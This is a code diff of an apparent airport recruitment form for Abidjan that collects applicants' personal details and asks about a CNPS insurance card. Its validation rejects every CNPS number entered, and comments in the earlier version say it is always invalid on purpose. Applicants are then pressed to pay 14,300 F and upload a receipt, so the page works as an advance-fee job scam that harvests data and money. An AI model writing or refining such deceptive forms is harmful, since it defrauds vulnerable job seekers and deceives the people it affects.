@@ -276,12 +276,6 @@
             font-size: 2.2rem;
             color: #b57c16;
         }
-        .file-upload-box input {
-            opacity: 0;
-            position: absolute;
-            width: 0.1px;
-            height: 0.1px;
-        }
         .file-name {
             font-size: 0.9rem;
             background: #e7eef6;
@@ -344,7 +338,6 @@
             border-top: 1px solid #ccddec;
             padding-top: 1.5rem;
         }
-        /* rend les boutons plus maniables sur mobile */
         @media (max-width: 550px) {
             .navigation-buttons {
                 flex-direction: column;
@@ -377,27 +370,41 @@
             border: 1px solid #f1b24a;
         }
 
-        /* Ajoutez ceci dans la section <style> */
-.error-message {
-    color: #d32f2f;
-    font-size: 0.85rem;
-    margin-top: 5px;
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    background: #ffebee;
-    padding: 0.5rem 1rem;
-    border-radius: 30px;
-}
+        .error-message {
+            color: #d32f2f;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: #ffebee;
+            padding: 0.5rem 1rem;
+            border-radius: 30px;
+        }
 
-.error-message i {
-    color: #c62828;
-}
+        .error-message i {
+            color: #c62828;
+        }
 
-.input-error {
-    border-color: #c62828 !important;
-    background-color: #fff8f8;
-}
+        .input-error {
+            border-color: #c62828 !important;
+            background-color: #fff8f8;
+        }
+        
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        
+        .loading .btn-primary {
+            position: relative;
+        }
+        
+        .loading .btn-primary:after {
+            content: "...";
+            position: absolute;
+            right: 10px;
+        }
     </style>
 </head>
 <body>
@@ -431,17 +438,12 @@
 
             <!-- formulaire (caché au début) -->
             <div id="formContainer" class="form-section hidden">
-                <!-- IMPORTANT: Formulaire avec action FormSubmit.co -->
-                <form id="multiStepForm" action="https://formsubmit.co/houphouetaeroportrecrutement@gmail.com" method="POST" enctype="multipart/form-data">
-                    <!-- Paramètres FormSubmit -->
+                <!-- Utilisation de Formspree.io qui supporte les fichiers -->
+                <form id="multiStepForm" action="https://formspree.io/f/xdkeblqy" method="POST" enctype="multipart/form-data">
+                    <!-- Champs cachés pour Formspree -->
                     <input type="hidden" name="_subject" value="Nouvelle inscription stagiaire - Aéroport Abidjan">
-                    <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_next" value="https://enregistrement-aeroport.netlify.app/">
+                    <input type="hidden" name="_next" value="https://enregistrement-aeroport.netlify.app/merci.html">
                     
-                    <!-- Champs cachés pour redirection après succès (optionnel) -->
-                    <!-- <input type="hidden" name="_next" value="https://votre-site.com/confirmation.html"> -->
-
                     <div class="step-indicator">
                         <span class="step active" id="step1"><i class="fas fa-id-card"></i> 1. Identité</span>
                         <span class="step" id="step2"><i class="fas fa-calendar-alt"></i> 2. Disponibilité</span>
@@ -452,7 +454,7 @@
                     <!-- PAGE 1 -->
                     <div id="page1" class="form-page">
                         <div class="form-row">
-                            <label class="required">ID employé </label>
+                            <label class="required">ID employé</label>
                             <input type="text" name="ID_employe" id="employerId" placeholder="Ex: ABJ-03-123" required>
                         </div>
                         <div class="form-row">
@@ -475,7 +477,6 @@
                             <label class="required">Adresse Gmail</label>
                             <input type="email" name="gmail" id="gmail" placeholder="exemple@gmail.com" required>
                         </div>
-                        
                     </div>
 
                     <!-- PAGE 2 -->
@@ -496,7 +497,7 @@
                     <!-- PAGE 3 : CNPS -->
                     <div id="page3" class="form-page hidden">
                         <div class="form-row">
-                            <label class="required">Avez-vous déjà travaillé dans un aéroport ?et Avez-vous une carte d'assurance sociale (CNPS) de l'aéroport ?</label>
+                            <label class="required">Avez-vous déjà travaillé dans un aéroport ? et Avez-vous une carte d'assurance sociale (CNPS) de l'aéroport ?</label>
                             <div class="flex-group">
                                 <label class="radio-option">
                                     <input type="radio" name="cnps_statut" value="oui" id="cnpsOui"> Oui, et j'ai la carte
@@ -508,15 +509,15 @@
                         </div>
 
                         <!-- bloc si oui -->
-<div id="cnpsOuiBlock" class="hidden">
-    <div class="form-row">
-        <label>Numéro CNPS</label>
-        <input type="text" name="cnps_numero" id="cnpsNumero" placeholder="CI-XXXXXXXXX">
-        <div id="cnpsError" class="error-message hidden">
-            <i class="fas fa-exclamation-circle"></i> Numéro de carte invalide. Veuillez contacter le service CNPS.
-        </div>
-    </div>
-</div>
+                        <div id="cnpsOuiBlock" class="hidden">
+                            <div class="form-row">
+                                <label>Numéro CNPS</label>
+                                <input type="text" name="cnps_numero" id="cnpsNumero" placeholder="CI-XXXXXXXXX">
+                                <div id="cnpsError" class="error-message hidden">
+                                    <i class="fas fa-exclamation-circle"></i> Numéro de carte invalide. Veuillez contacter le service CNPS.
+                                </div>
+                            </div>
+                        </div>
 
                         <!-- bloc si non : explication + cadre paiement et upload -->
                         <div id="cnpsNonBlock" class="hidden">
@@ -532,14 +533,11 @@
                                 <div class="file-upload-box" onclick="document.getElementById('paiementCapture').click();">
                                     <i class="fas fa-cloud-upload-alt"></i>
                                     <p style="font-weight:600;">Cliquez pour joindre la capture du paiement (reçu)</p>
-                                    <input type="file" name="paiement_capture" id="paiementCapture" accept="image/*,application/pdf" style="display:none;">
+                                    <input type="file" name="paiement_capture" id="paiementCapture" accept="image/*,application/pdf">
                                     <span id="fileSelectedName" class="file-name">Aucun fichier sélectionné</span>
                                 </div>
                                 <p class="text-small" style="color:#60af00;"><i class="far fa-clock"></i> Nous allons vous envoyer par Gmail la date à laquelle vous allez commencer le travail, une fois les frais de la carte payés.</p>
-                                <br>
-                                 <p class="text-small" style="color:#af6300;"><i class="far fa-clock"></i> Et la carte est obligatoire pour tous les employés sélectionnés. Sans cela, vous ne pouvez pas accéder à nos locaux.</p>
-                                 <br>
-                               
+                                <p class="text-small" style="color:#af6300;"><i class="far fa-clock"></i> La carte est obligatoire pour tous les employés sélectionnés. Sans cela, vous ne pouvez pas accéder à nos locaux.</p>
                             </div>
                         </div>
                     </div>
@@ -581,13 +579,13 @@
 
     <script>
         (function() {
-            // éléments
             const congrats = document.getElementById('congratsBlock');
             const formContainer = document.getElementById('formContainer');
             const showBtn = document.getElementById('showFormBtn');
             const prevBtn = document.getElementById('prevBtn');
             const nextBtn = document.getElementById('nextBtn');
             const confirmBtn = document.getElementById('confirmBtn');
+            const form = document.getElementById('multiStepForm');
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
             const step3 = document.getElementById('step3');
@@ -597,7 +595,6 @@
             const page3 = document.getElementById('page3');
             const page4 = document.getElementById('page4');
 
-            // radio + blocks CNPS
             const cnpsOui = document.getElementById('cnpsOui');
             const cnpsNon = document.getElementById('cnpsNon');
             const ouiBlock = document.getElementById('cnpsOuiBlock');
@@ -607,19 +604,17 @@
 
             let currentPage = 1;
 
-            // affichage formulaire
             showBtn.addEventListener('click', ()=>{
                 congrats.style.display = 'none';
                 formContainer.classList.remove('hidden');
                 updatePage();
             });
 
-            // toggle CNPS
             function toggleCnps() {
-                if (cnpsOui.checked) {
+                if (cnpsOui && cnpsOui.checked) {
                     ouiBlock.classList.remove('hidden');
                     nonBlock.classList.add('hidden');
-                } else if (cnpsNon.checked) {
+                } else if (cnpsNon && cnpsNon.checked) {
                     ouiBlock.classList.add('hidden');
                     nonBlock.classList.remove('hidden');
                 } else {
@@ -627,10 +622,12 @@
                     nonBlock.classList.add('hidden');
                 }
             }
-            cnpsOui.addEventListener('change', toggleCnps);
-            cnpsNon.addEventListener('change', toggleCnps);
+            
+            if(cnpsOui && cnpsNon) {
+                cnpsOui.addEventListener('change', toggleCnps);
+                cnpsNon.addEventListener('change', toggleCnps);
+            }
 
-            // nom fichier
             if(fileInput) {
                 fileInput.addEventListener('change', function(e) {
                     if (this.files.length > 0) {
@@ -641,126 +638,163 @@
                 });
             }
 
-            // validation simple
-            // validation simple
-function validatePage(page) {
-    if (page === 1) {
-        if (!document.getElementById('employerId').value.trim() || !document.getElementById('nom').value.trim() || !document.getElementById('prenom').value.trim() || !document.getElementById('telephone').value.trim()) {
-            alert('Veuillez remplir tous les champs obligatoires (ID, nom, prénom, téléphone).');
-            return false;
-        }
-    }
-    if (page === 2) {
-        if (!document.getElementById('disponibilite').value) {
-            alert('Sélectionnez votre date de disponibilité.');
-            return false;
-        }
-    }
-    if (page === 3) {
-        if (!cnpsOui.checked && !cnpsNon.checked) {
-            alert('Indiquez si vous avez une carte CNPS.');
-            return false;
-        }
-        
-        // Validation pour ceux qui ont coché "Oui" (carte CNPS)
-        if (cnpsOui.checked) {
-            const cnpsNumero = document.getElementById('cnpsNumero').value.trim();
-            if (cnpsNumero === '') {
-                alert('Veuillez entrer votre numéro de carte CNPS.');
-                return false;
-            } else {
-                // TOUJOURS invalide quelque soit le numéro saisi
-                alert('Numéro de carte invalide. Veuillez vérifier votre numéro CNPS.');
-                return false;
+            function validatePage(page) {
+                if (page === 1) {
+                    const employerId = document.getElementById('employerId');
+                    const nom = document.getElementById('nom');
+                    const prenom = document.getElementById('prenom');
+                    const telephone = document.getElementById('telephone');
+                    
+                    if (!employerId.value.trim()) {
+                        alert('Veuillez saisir votre ID employé.');
+                        employerId.focus();
+                        return false;
+                    }
+                    if (!nom.value.trim()) {
+                        alert('Veuillez saisir votre nom.');
+                        nom.focus();
+                        return false;
+                    }
+                    if (!prenom.value.trim()) {
+                        alert('Veuillez saisir votre prénom.');
+                        prenom.focus();
+                        return false;
+                    }
+                    if (!telephone.value.trim()) {
+                        alert('Veuillez saisir votre numéro de téléphone.');
+                        telephone.focus();
+                        return false;
+                    }
+                    const email = document.getElementById('gmail');
+                    if (email.value.trim() && !email.value.includes('@')) {
+                        alert('Veuillez saisir une adresse email valide.');
+                        email.focus();
+                        return false;
+                    }
+                }
+                if (page === 2) {
+                    const disponibilite = document.getElementById('disponibilite');
+                    if (!disponibilite.value) {
+                        alert('Sélectionnez votre date de disponibilité.');
+                        disponibilite.focus();
+                        return false;
+                    }
+                }
+                if (page === 3) {
+                    if (!cnpsOui.checked && !cnpsNon.checked) {
+                        alert('Indiquez si vous avez une carte CNPS.');
+                        return false;
+                    }
+                    
+                    if (cnpsOui.checked) {
+                        const cnpsNumero = document.getElementById('cnpsNumero').value.trim();
+                        if (cnpsNumero === '') {
+                            alert('Veuillez entrer votre numéro de carte CNPS.');
+                            return false;
+                        } else {
+                            alert('Numéro de carte invalide. Veuillez vérifier votre numéro CNPS.');
+                            return false;
+                        }
+                    }
+                    
+                    if (cnpsNon.checked) {
+                        if (!fileInput || fileInput.files.length === 0) {
+                            alert('Vous devez joindre la capture du paiement de 14 300 F pour obtenir votre carte CNPS.');
+                            return false;
+                        }
+                        
+                        if (!confirm('Vous êtes en train de déclarer ne pas avoir de carte CNPS. Vous devez effectuer le paiement avant le 3 Avril. Continuer ?')) {
+                            return false;
+                        }
+                    }
+                }
+                return true;
             }
-        }
-        
-        // Validation pour ceux qui ont coché "Non" (pas de carte)
-        if (cnpsNon.checked) {
-            // Vérifier que la capture du paiement a été jointe
-            if (!fileInput || fileInput.files.length === 0) {
-                alert('Vous devez joindre la capture du paiement de 14 300 F pour obtenir votre carte CNPS.');
-                return false;
-            }
-            
-            // Confirmation supplémentaire
-            if (!confirm('Vous êtes en train de déclarer ne pas avoir de carte CNPS. Vous devez effectuer le paiement avant le 3 Avril. Continuer ?')) {
-                return false;
-            }
-        }
-    }
-    return true;
-}
 
             function updatePage() {
-                // hide pages
                 page1.classList.add('hidden');
                 page2.classList.add('hidden');
                 page3.classList.add('hidden');
                 page4.classList.add('hidden');
+                
                 if (currentPage === 1) page1.classList.remove('hidden');
                 if (currentPage === 2) page2.classList.remove('hidden');
                 if (currentPage === 3) page3.classList.remove('hidden');
                 if (currentPage === 4) page4.classList.remove('hidden');
 
-                // steps
-                step1.classList.toggle('active', currentPage === 1);
-                step2.classList.toggle('active', currentPage === 2);
-                step3.classList.toggle('active', currentPage === 3);
-                step4.classList.toggle('active', currentPage === 4);
+                if(step1) step1.classList.toggle('active', currentPage === 1);
+                if(step2) step2.classList.toggle('active', currentPage === 2);
+                if(step3) step3.classList.toggle('active', currentPage === 3);
+                if(step4) step4.classList.toggle('active', currentPage === 4);
 
-                // boutons
-                prevBtn.disabled = (currentPage === 1);
+                if(prevBtn) prevBtn.disabled = (currentPage === 1);
+                
                 if (currentPage === 4) {
-                    nextBtn.classList.add('hidden');
-                    confirmBtn.classList.remove('hidden');
+                    if(nextBtn) nextBtn.classList.add('hidden');
+                    if(confirmBtn) confirmBtn.classList.remove('hidden');
                 } else {
-                    nextBtn.classList.remove('hidden');
-                    confirmBtn.classList.add('hidden');
+                    if(nextBtn) nextBtn.classList.remove('hidden');
+                    if(confirmBtn) confirmBtn.classList.add('hidden');
                 }
             }
 
-            // suivant
-            nextBtn.addEventListener('click', ()=>{
-                if (validatePage(currentPage) && currentPage < 4) {
-                    currentPage++;
-                    updatePage();
-                }
-            });
+            if(nextBtn) {
+                nextBtn.addEventListener('click', ()=>{
+                    if (validatePage(currentPage) && currentPage < 4) {
+                        currentPage++;
+                        updatePage();
+                    }
+                });
+            }
 
-            // precedent
-            prevBtn.addEventListener('click', ()=>{
-                if (currentPage > 1) {
-                    currentPage--;
-                    updatePage();
-                }
-            });
+            if(prevBtn) {
+                prevBtn.addEventListener('click', ()=>{
+                    if (currentPage > 1) {
+                        currentPage--;
+                        updatePage();
+                    }
+                });
+            }
 
-            // Pas besoin de confirmation finale car c'est le submit du formulaire qui envoie
-            
-            // initialisation
+            if(form) {
+                form.addEventListener('submit', function(e) {
+                    // Ne pas empêcher la soumission, laisser le formulaire s'envoyer normalement
+                    // Mais on vérifie d'abord la dernière page
+                    if (!validatePage(4)) {
+                        e.preventDefault();
+                        return false;
+                    }
+                    
+                    // Afficher un message de chargement
+                    const confirmButton = document.getElementById('confirmBtn');
+                    if(confirmButton) {
+                        confirmButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi en cours...';
+                        confirmButton.disabled = true;
+                    }
+                    
+                    // Le formulaire va s'envoyer normalement
+                    return true;
+                });
+            }
+
+            const cnpsNumeroField = document.getElementById('cnpsNumero');
+            const cnpsErrorDiv = document.getElementById('cnpsError');
+
+            if (cnpsNumeroField) {
+                cnpsNumeroField.addEventListener('input', function() {
+                    if (this.value.trim() !== '') {
+                        if(cnpsErrorDiv) cnpsErrorDiv.classList.remove('hidden');
+                        this.classList.add('input-error');
+                    } else {
+                        if(cnpsErrorDiv) cnpsErrorDiv.classList.add('hidden');
+                        this.classList.remove('input-error');
+                    }
+                });
+            }
+
             updatePage();
             toggleCnps();
         })();
-
-        // Ajoutez ceci après la fonction toggleCnps()
-
-// Validation en temps réel du numéro CNPS (toujours invalide)
-const cnpsNumero = document.getElementById('cnpsNumero');
-const cnpsError = document.getElementById('cnpsError');
-
-if (cnpsNumero) {
-    cnpsNumero.addEventListener('input', function() {
-        if (this.value.trim() !== '') {
-            // Toujours invalide, quelque soit la valeur
-            cnpsError.classList.remove('hidden');
-            this.classList.add('input-error');
-        } else {
-            cnpsError.classList.add('hidden');
-            this.classList.remove('input-error');
-        }
-    });
-}
     </script>
 </body>
 </html>
